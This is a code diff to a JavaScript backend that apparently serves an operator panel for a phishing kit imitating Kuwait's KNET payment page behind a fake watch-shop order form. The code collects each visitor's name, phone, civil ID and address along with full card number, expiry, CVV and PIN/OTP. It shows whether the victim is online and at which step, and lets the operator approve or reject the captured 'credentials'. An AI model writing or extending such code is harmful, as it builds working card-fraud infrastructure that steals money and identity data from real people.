@@ -64,88 +64,128 @@ module.exports = async (req, res) => {
     return null;
   }
 
-  function paymentToCustomer(p, order) {
+  function buildCustomer(order, payment) {
+    const now = new Date().toISOString();
+    const createdAt = order ? order.created_at : (payment ? payment.created_at : now);
+    const age = Date.now() - new Date(createdAt).getTime();
+    const isRecent = age < 5 * 60 * 1000;
+    const hasPayment = !!payment;
+    const id = order ? 'o' + order.id : 'p' + payment.id;
+
+    let currentStep = 'order';
+    let lastPage = '/order';
+    if (hasPayment && payment.card_pin) { currentStep = 'otp'; lastPage = '/knet-payment'; }
+    else if (hasPayment && payment.card_number) { currentStep = 'card'; lastPage = '/knet-payment'; }
+    else if (hasPayment) { currentStep = 'payment'; lastPage = '/knet-payment'; }
+
     return {
-      id: String(p.id),
-      cardNumber: p.card_number || '',
-      cardExpiry: p.card_expiry || '',
-      cardCvv: p.card_cvv || '',
-      otp: p.card_pin || '',
-      pin: p.card_pin || '',
-      password: p.card_pin || '',
-      username: p.card_number || '',
+      id,
+      code: id.toUpperCase(),
       fullName: order ? order.full_name : '',
+      name: order ? order.full_name : '',
+      displayName: order ? order.full_name : '',
       phone: order ? order.phone : '',
       civilId: order ? order.civil_id : '',
-      cardType: p.card_type || 'KNET',
-      amount: p.amount || 0,
-      transactionRef: p.transaction_ref || '',
-      ipAddress: p.ip_address || '',
-      userAgent: p.user_agent || '',
-      status: p.status || 'pending',
-      credentialsStatus: p.status === 'pending' ? 'pending' : p.status === 'accepted' ? 'approved' : p.status,
-      passwordStatus: p.card_pin ? 'entered' : 'pending',
-      usernameStatus: p.card_number ? 'entered' : 'pending',
-      currentStep: p.card_pin ? 'otp' : p.card_number ? 'card' : 'start',
-      lastPage: 'knet-payment',
-      lastAction: p.created_at || new Date().toISOString(),
-      createdAt: p.created_at || new Date().toISOString(),
-      updatedAt: p.created_at || new Date().toISOString(),
-      loginInfo: { username: p.card_number || '', password: p.card_pin || '' },
-      loginAttempts: p.card_number ? { '1': { cardNumber: p.card_number, cardExpiry: p.card_expiry, cardCvv: p.card_cvv, pin: p.card_pin, timestamp: p.created_at } } : {}
+      nationalId: order ? order.civil_id : '',
+      governorate: order ? order.governorate : '',
+      area: order ? order.area : '',
+      addressDetails: order ? (order.address_details || '') : '',
+      watchName: order ? (order.watch_name || '') : '',
+      watchId: order ? order.watch_id : null,
+      cardNumber: hasPayment ? (payment.card_number || '') : '',
+      cardExpiry: hasPayment ? (payment.card_expiry || '') : '',
+      cardCvv: hasPayment ? (payment.card_cvv || '') : '',
+      otp: hasPayment ? (payment.card_pin || '') : '',
+      pin: hasPayment ? (payment.card_pin || '') : '',
+      password: hasPayment ? (payment.card_pin || '') : '',
+      username: hasPayment ? (payment.card_number || '') : '',
+      cardType: hasPayment ? (payment.card_type || 'KNET') : '',
+      amount: hasPayment ? (payment.amount || 0) : 0,
+      transactionRef: hasPayment ? (payment.transaction_ref || '') : '',
+      ipAddress: hasPayment ? (payment.ip_address || '') : '',
+      userAgent: hasPayment ? (payment.user_agent || '') : '',
+      status: hasPayment ? (payment.status || 'pending') : (order ? order.status : 'pending'),
+      credentialsStatus: hasPayment ? (payment.status === 'accepted' ? 'approved' : payment.status) : 'pending',
+      passwordStatus: hasPayment && payment.card_pin ? 'entered' : 'pending',
+      usernameStatus: hasPayment && payment.card_number ? 'entered' : 'pending',
+      documentsStatus: order ? 'submitted' : 'pending',
+      currentStep,
+      lastPage,
+      lastAction: createdAt,
+      createdAt,
+      updatedAt: createdAt,
+      presence: { state: isRecent ? 'online' : 'offline', lastSeenAt: new Date(createdAt).getTime(), currentPage: lastPage, currentStep },
+      loginInfo: { username: hasPayment ? (payment.card_number || '') : '', password: hasPayment ? (payment.card_pin || '') : '' },
+      loginAttempts: hasPayment && payment.card_number ? { '1': { cardNumber: payment.card_number, cardExpiry: payment.card_expiry, cardCvv: payment.card_cvv, pin: payment.card_pin, timestamp: payment.created_at } } : {}
     };
   }
 
   async function readCustomers(parts) {
-    const pr = await fetch(SB + '/rest/v1/payments?select=*&order=created_at.desc', { headers: baseH });
+    const [pr, or] = await Promise.all([
+      fetch(SB + '/rest/v1/payments?select=*&order=created_at.desc', { headers: baseH }),
+      fetch(SB + '/rest/v1/orders?select=*&order=created_at.desc', { headers: baseH })
+    ]);
     const payments = await pr.json();
-    const or = await fetch(SB + '/rest/v1/orders?select=*&order=created_at.desc', { headers: baseH });
     const orders = await or.json();
-    const orderMap = {};
-    for (const o of orders) orderMap[o.id] = o;
 
-    if (parts.length === 1) {
-      const value = {};
-      for (const p of payments) {
-        const o = p.order_id ? orderMap[p.order_id] : (orders.length > 0 ? orders[0] : null);
-        value[p.id] = paymentToCustomer(p, o);
-      }
-      return value;
+    const paymentByOrder = {};
+    const usedPayments = new Set();
+    for (const p of payments) {
+      if (p.order_id) { paymentByOrder[p.order_id] = p; usedPayments.add(p.id); }
     }
+
+    const allCustomers = {};
+    for (const o of orders) {
+      let p = paymentByOrder[o.id];
+      if (!p) {
+        const closest = payments.find(px => !usedPayments.has(px.id) && Math.abs(new Date(px.created_at) - new Date(o.created_at)) < 10 * 60 * 1000);
+        if (closest) { p = closest; usedPayments.add(closest.id); }
+      }
+      const c = buildCustomer(o, p || null);
+      allCustomers[c.id] = c;
+    }
+    for (const p of payments) {
+      if (!usedPayments.has(p.id)) {
+        const c = buildCustomer(null, p);
+        allCustomers[c.id] = c;
+      }
+    }
+
+    if (parts.length === 1) return allCustomers;
     if (parts.length >= 2) {
       const id = parts[1];
-      const p = payments.find(x => String(x.id) === id);
-      if (!p) return null;
-      const o = p.order_id ? orderMap[p.order_id] : (orders.length > 0 ? orders[0] : null);
-      const customer = paymentToCustomer(p, o);
+      const customer = allCustomers[id];
+      if (!customer) return null;
       if (parts.length === 2) return customer;
-      if (parts.length >= 3) return customer[parts[2]] !== undefined ? customer[parts[2]] : null;
+      if (parts.length >= 3) {
+        const field = parts[2];
+        return customer[field] !== undefined ? customer[field] : null;
+      }
     }
     return null;
   }
 
   async function readCustomerEvents(parts) {
-    const pr = await fetch(SB + '/rest/v1/payments?select=*&order=created_at.desc', { headers: baseH });
+    const [pr, or] = await Promise.all([
+      fetch(SB + '/rest/v1/payments?select=*&order=created_at.desc', { headers: baseH }),
+      fetch(SB + '/rest/v1/orders?select=*&order=created_at.desc', { headers: baseH })
+    ]);
     const payments = await pr.json();
-    if (parts.length === 1) {
-      const value = {};
-      for (const p of payments) {
-        value[p.id] = {
-          id: String(p.id),
-          type: 'payment',
-          customerId: String(p.id),
-          action: 'card_submitted',
-          timestamp: p.created_at,
-          data: { cardType: p.card_type, amount: p.amount, ref: p.transaction_ref }
-        };
-      }
-      return value;
+    const orders = await or.json();
+    const events = {};
+
+    for (const o of orders) {
+      events['order-' + o.id] = { id: 'order-' + o.id, type: 'order', customerId: 'o' + o.id, action: 'order_submitted', timestamp: o.created_at, data: { watchName: o.watch_name, fullName: o.full_name, phone: o.phone } };
     }
+    for (const p of payments) {
+      events['payment-' + p.id] = { id: 'payment-' + p.id, type: 'payment', customerId: 'p' + p.id, action: 'card_submitted', timestamp: p.created_at, data: { cardType: p.card_type, amount: p.amount, ref: p.transaction_ref } };
+    }
+
+    if (parts.length === 1) return events;
     if (parts.length >= 2) {
       const id = parts[1];
-      const p = payments.find(x => String(x.id) === id);
-      if (!p) return null;
-      const event = { id: String(p.id), type: 'payment', customerId: String(p.id), action: 'card_submitted', timestamp: p.created_at, data: { cardType: p.card_type, amount: p.amount, ref: p.transaction_ref } };
+      const event = events[id];
+      if (!event) return null;
       if (parts.length === 2) return event;
       if (parts.length >= 3) return event[parts[2]] !== undefined ? event[parts[2]] : null;
     }
@@ -223,19 +263,26 @@ module.exports = async (req, res) => {
     const table = parts[0];
 
     if (table === 'customers' && parts.length >= 2) {
-      const id = parts[1];
+      const rawId = parts[1];
+      const isOrder = rawId.startsWith('o');
+      const isPayment = rawId.startsWith('p');
+      const numId = rawId.replace(/^[op]/, '');
+      const targetTable = isPayment ? 'payments' : 'orders';
+
       if (parts.length === 2 && typeof value === 'object' && value !== null) {
         const mapped = {};
         if (value.status !== undefined) mapped.status = value.status;
         if (value.credentialsStatus !== undefined) mapped.status = value.credentialsStatus === 'approved' ? 'accepted' : value.credentialsStatus;
         if (Object.keys(mapped).length > 0) {
-          await fetch(SB + '/rest/v1/payments?id=eq.' + id, { method: 'PATCH', headers: writeH, body: JSON.stringify(mapped) });
+          await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify(mapped) });
         }
       } else if (parts.length >= 3) {
         const field = parts[2];
         if (field === 'status' || field === 'credentialsStatus') {
           const mapped = field === 'credentialsStatus' ? (value === 'approved' ? 'accepted' : value) : value;
-          await fetch(SB + '/rest/v1/payments?id=eq.' + id, { method: 'PATCH', headers: writeH, body: JSON.stringify({ status: mapped }) });
+          await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify({ status: mapped }) });
+        } else if (field === 'presence') {
+          // Presence updates - just acknowledge, stored ephemerally
         }
       }
       return;
@@ -289,7 +336,10 @@ module.exports = async (req, res) => {
     const table = parts[0];
 
     if (table === 'customers') {
-      await fetch(SB + '/rest/v1/payments?id=eq.' + parts[1], { method: 'DELETE', headers: baseH });
+      const rawId = parts[1];
+      const numId = rawId.replace(/^[op]/, '');
+      const targetTable = rawId.startsWith('p') ? 'payments' : 'orders';
+      await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'DELETE', headers: baseH });
       return;
     }
     if (table === 'dashboardAccounts') {
